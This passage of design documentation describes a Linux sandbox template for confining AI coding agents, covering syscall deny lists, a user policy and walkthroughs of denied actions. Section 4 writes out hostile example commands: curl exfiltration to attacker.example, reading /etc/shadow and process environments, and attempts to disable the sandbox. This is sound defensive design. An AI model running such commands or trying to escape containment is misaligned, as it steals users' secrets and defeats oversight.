    "process_vm_readv",          # cross-process memory reads
    "process_vm_writev",
    "kexec_load",
    "kexec_file_load",
    "mount", "umount", "umount2",
    "pivot_root",
    "swapon", "swapoff",
    "reboot",
    "init_module", "finit_module", "delete_module",
    "create_module", "get_kernel_syms", "query_module",
    "lookup_dcookie",
    "personality",               # historical bypass via personality flags
]


# ============================================================================
# 11. LIFECYCLE
#
# The template does not set a TTL; AI coding contexts may run for an
# entire workday. User policies can override.
# ============================================================================

[lifecycle]
ttl = "8h"                       # default: one workday
ttl_action = "warn"              # warn at TTL; user can renew


# ============================================================================
# 12. FRAMEWORK INVARIANTS (REMINDER)
#
# These properties cannot be changed by user deltas, even with reasons.
# Listed here for completeness; enforced by the schema validator at
# policy load time.
# ============================================================================

# [[net.deny.invariant]] entries above are template-level invariants
# (this template marks them so; downstream user policies cannot remove).
#
# Framework-level invariants (set in schema/invariants.toml, not here):
#   - cap.no_new_privs = true
#   - exec.deny_setuid = true
#   - The presence of the constructed-view shim ($HOME points to shim_root)
#   - The presence of the SOCKS5 proxy as the only network egress path
#   - The hidepid mount on /proc
#   - The PID namespace
#
# Any policy attempting to weaken these is rejected by the validator.
```

---

## Section 3 — A typical user policy on top

A developer using this template against a single project writes approximately the following file. It is short by design.

```toml
# ~/.config/kennel/kennels/myproj-ai.toml
template = "ai-coding-strict"
template_version = "4"
name = "myproj-ai"

# Add the project tree.
[fs.read.add]
- path = "~/projects/myproj/**"
  reason = "the project I am working on"

[fs.write.add]
- path = "~/projects/myproj/**"
  reason = "the project I am working on"

# Add the LLM API endpoint for whichever agent the developer is using.
[net.allow.add]
- name = "api.anthropic.com"
  ports = [443]
  protocol = "tcp"
  tls.required = true
  reason = "Claude API"
  threats.exposed = ["T1.8"]
```

That is the entire user-authored policy. Everything else — the credential denylist, the constructed view of $HOME, the per-kennel loopback, the seccomp filter, the proxy configuration, the AF_UNIX shim — is inherited from the template.

When the developer switches from Claude Code to Codex CLI, the only change is to add `api.openai.com` to `net.allow`. The rest of the policy is unchanged. This is what "agent-agnostic policy" means in practice: the policy describes constraints on what any process running inside the kennel may do, not constraints on a specific agent's behaviour.

---

## Section 4 — What this template prevents, demonstrated

To make the protection concrete, walk through a few specific things the agent might try, and what happens.

**The agent runs `find ~ -name '*.env'`.**

The agent's view of `~` is `/run/kennel/<kennel>/home`, a tmpfs into which only the policy-granted paths are bind-mounted. The user's real home directory's `.env` files do not exist in this view. `find` traverses the agent's view and reports nothing. The agent has no way to discover that the user has `.env` files elsewhere; the entire surface is structurally invisible.

If the project tree contains a `.env`, `fs.scrub` overlays a tmpfs at that file path. The agent's `cat .env` returns an empty file. The agent can attempt to recover the contents by reading the project tree from a different angle — `git show HEAD:.env`, for example. Project Kennel cannot prevent this entirely without breaking git's legitimate operations; the scrub layer is best-effort against direct reads, not against semantic-level recovery. (This is acknowledged in the residuals.)

**The agent attempts `curl https://attacker.example/exfil --data @secrets.txt`.**

The DNS resolution for `attacker.example` fails at the proxy because the name is not in `net.allow`. The proxy responds with SOCKS5 reply 0x04 (host unreachable). curl reports the failure. The audit log records a deny event with the requested destination, the requesting PID, and the byte count of the (refused) request body.

If the agent attempts to bypass the proxy with a direct connect — say, by hard-coding an IP address — the cgroup BPF rule on `inet4_connect` denies the syscall before it reaches the network stack. The agent sees ECONNREFUSED. The audit log records a kernel-level deny event with the attempted destination.

**The agent attempts `sudo cat /etc/shadow`.**

`/usr/bin/sudo` is in `exec.deny`. Landlock's `FS_EXECUTE` rule denies the execve with EACCES. The agent's shell reports "sudo: command not found" (with the PATH set as it is) or "Permission denied" (if it tries the full path). The audit log records the denied execve.

Even if `sudo` somehow ran (it does not), `PR_SET_NO_NEW_PRIVS` neutralises its setuid behaviour: the process would execute as the agent's uid, not root, and the actual privilege escalation would fail. And even if it did escalate to root, Project Kennel's other constraints (filesystem, network, etc.) still apply, because Landlock and cgroup BPF rules attach to the cgroup, not the uid.

**The agent attempts to read `/proc/<user-shell-pid>/environ` to extract the user's environment variables.**

The agent is in its own PID namespace. The user's shell does not appear in the agent's `/proc`. The agent cannot enumerate it; cannot stat its `/proc` entry; cannot read its environ.

If the agent attempts `kill(<some-pid>, 0)` for various PIDs to find live processes, the kernel reports ESRCH for any PID outside the namespace — the kill returns "no such process" rather than "permission denied", giving no information about which PIDs exist on the host.

**The agent attempts to connect to the user's local Postgres at `127.0.0.1:5432`.**

The agent's `127.0.0.1` is not the user's `127.0.0.1`. The cgroup BPF connect rule denies connections to `127.0.0.1` (or rewrites them to the kennel's private subnet, depending on configuration). The user's Postgres on the host loopback is unreachable. The audit log records the attempt.

If the user wants the agent to reach Postgres legitimately (the `dev-server` template handles this case), they explicitly grant a `net.loopback.host_services` entry with a reason. The grant is visible in the policy diff, threat-tagged as T1.6 exposure.

**The agent attempts to disable the sandbox.**

The agent has no path to do this. Project Kennel's enforcement is at the kernel layer: Landlock rules are sealed after spawn, cgroup BPF programs are attached to a cgroup the agent cannot move out of, the mount namespace cannot be re-entered. There is no "sandbox process" the agent could kill; there is no "configuration file" the agent could modify (the policy is not bind-mounted into the agent's view). The Ona-style "let me try disabling the sandbox" reasoning has no actionable next step.

Project Kennel's host-side delegates (the SOCKS5 egress dialer, and the SSH bastion that re-originates git-over-SSH) run outside the kennel, in the operator's context; the agent cannot ptrace them, cannot signal them, cannot read their `/proc/<pid>/mem`. If the daemons crash, Project Kennel's supervisor restarts them; during the crash window, the cgroup BPF rules continue to deny direct connect() to anything other than the (now-restarting) proxy.

---

## Section 5 — Companion files

A complete template ships with several files in `templates/ai-coding-strict/`:

```
templates/ai-coding-strict/
├── policy.toml         The file shown above.
├── README.md           Audience: template users. Explains what the
│                       template defends, what it permits, when to
│                       use it vs alternatives.
├── THREATS.md          Audience: template authors and reviewers.
│                       Per-rule threat tags, mapped to the global
│                       THREATS.md catalogue. Lists which T-numbers
│                       this template defends against and at what
│                       coverage level.
├── CHANGELOG.md        Versioned changes between template versions.
│                       Stable format: "v4 (2026-05-16): added .env*
│                       to fs.scrub patterns (T2.3); rationale: ..."
├── meta.toml           Maintainer key reference, signing metadata,
│                       version, last-reviewed date.
└── tests/
    ├── allow.sh        Scripts verifying expected operations succeed
    │                   (e.g., npm install works, git push works,
    │                   curl to api.anthropic.com works).
    ├── deny.sh         Scripts verifying expected denials happen
    │                   (e.g., cat ~/.ssh/id_ed25519 fails, sudo fails,
    │                   curl to attacker.example fails).
    └── fixtures/       Test data (mock project trees, etc.)
```

These are mechanical to write once the policy is settled; the policy file is the substantive artefact.

---

## Section 6 — What this template is not

It is worth being explicit about what `ai-coding-strict` does not cover, so that template users do not assume more than is delivered.

**Multi-project workflows.** A developer working on three projects simultaneously needs three contexts, each derived from this template with a different project path. Project Kennel supports this directly; the policy author writes one leaf policy per kennel.

**Workflows requiring GUI tooling.** An AI agent that needs to spawn a browser, an Electron app, or any X11/Wayland client needs the `x11-isolated-dev` template instead. This template does not provision a display server.

**Workflows requiring docker, kubernetes, or systemd-user operations.** The `containerised-dev` template covers Docker; equivalent templates cover Kubernetes (`k8s-coding`) and systemd (`systemd-coding`). Each documents the threat-impact of the additional capabilities granted.

**Workflows requiring open internet egress.** Some build pipelines need to fetch from arbitrary URLs (cargo dependencies from random git repos, for example). The `ai-coding-permissive` template sets `net.mode = "open"` with full audit; the strict template does not.

**MCP server access.** A confined agent that needs to talk to an MCP server requires either the MCP server inside the same kennel (added to `exec.allow`) or a careful AF_UNIX socket grant (added to `unix.allow` with a reason). See T3.6 (MCP server capability creep) in THREATS.md for the threat-model treatment. Neither is the default; both are user-policy deltas.

**Long-lived background contexts.** The TTL of 8 hours is suited to interactive coding sessions. Background services (a watcher, a periodic task) need a different lifecycle policy and probably a different template.

---

## Section 7 — Versioning and review

The template is at v4. Earlier versions exist for backward compatibility; user policies that pin to v3 continue to work, and Project Kennel warns the user when an upgrade is available. The `kennel policy upgrade <kennel>` command shows the diff between the user's pinned version and the latest, with threat-impact annotations on each change.

A new version of the template is published when:
- A new threat is added to the catalogue and this template's defaults should defend against it. The template's version bumps to track.
- A new kernel feature becomes available that improves enforcement (e.g., Landlock network policy in kernel 6.7+).
- A category of agent behaviour is observed in the wild that the current template does not address.
- A bug is found in the template's enforcement claims.

Each version is signed by the project's maintainers. Customer-deployed organisational variants are signed by the customer's signing infrastructure. Project Kennel refuses to load templates with invalid signatures unless explicitly overridden.

---

## Section 8 — How to read this document

This worked template is referenced from the design document's §5 (templates) and §6 (worked examples). The policy shown here is concrete; the §7 mechanism reference is abstract. Reading this template first gives the mechanism reference something to anchor against.

Readers who want to know "is this implementable on real Linux" should focus on the inline comments — each policy element references the specific kernel mechanism that implements it, and the references are precise enough to verify by reading the kernel documentation directly. Landlock, cgroup BPF, mount namespaces, PID namespaces, seccomp, AppArmor, and PR_SET_NO_NEW_PRIVS are the only kernel mechanisms invoked; no kernel patches are required.

Readers who want to know "what does this look like operationally" should focus on Section 3 (the user's leaf policy) and Section 4 (the demonstrated denials). The leaf policy is ~10 lines; the demonstrated denials cover the most common threats the template defends against.

Readers who want to know "what does this not cover" should focus on Section 6 (what the template is not) and the residuals noted in Section 1.

---

*This worked template accompanies the design document and the threat catalogue. The structural shape — every table, field, and type — is the generated machine schema [`schema/policy.toml.schema`](../../schema/policy.toml.schema); the syntax semantics (the `[[net.proxy.deny.invariant]]` array-of-tables form, the `~/` expansion, the `<kennel>` and `<tag>` substitution patterns) are documented authoritatively in [02-2-config-schema.md](../architecture/02-2-config-schema.md).*
